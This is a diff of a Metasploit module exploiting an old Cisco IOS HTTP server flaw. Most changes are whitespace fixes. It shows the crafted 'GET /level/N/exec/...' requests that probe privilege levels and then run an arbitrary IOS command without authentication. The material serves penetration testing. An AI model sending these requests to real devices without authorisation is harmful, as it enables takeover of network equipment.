@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::Tcp
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Cisco IOS HTTP Unauthorized Administrative Access',
 			'Description'    => %q{
 				This module exploits a vulnerability in the Cisco IOS HTTP Server.
@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 				Opt::RPORT(80),
 				OptString.new('CMD', [ true, "Cisco IOS command", 'show start' ])
 			], self.class)
-						
+
 	end
 
 	def run
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 			sploit = "GET /level/" + level.to_s + "/exec/show%20privilege HTTP/1.0\r\n\r\n"
 			sock.put(sploit)
 
-			result = sock.get(-1,-3)
+			result = sock.get(-1, 3)
 			disconnect
 
 			if (result =~ /Current privilege level is/)
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 				sploit = "GET /level/" + level.to_s + "/exec/" + xCMD + " HTTP/1.0\r\n\r\n"
 				sock.put(sploit)
 
-				result = sock.get(-1,-3)
+				result = sock.get(-1, 3)
 				print_status(result.to_s)
 
 				disconnect
@@ -77,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 		end
-		
+
 	end
 
 end
@@ -136,3 +136,4 @@ Example Exploit:
 	[snip]
 
 =end
+
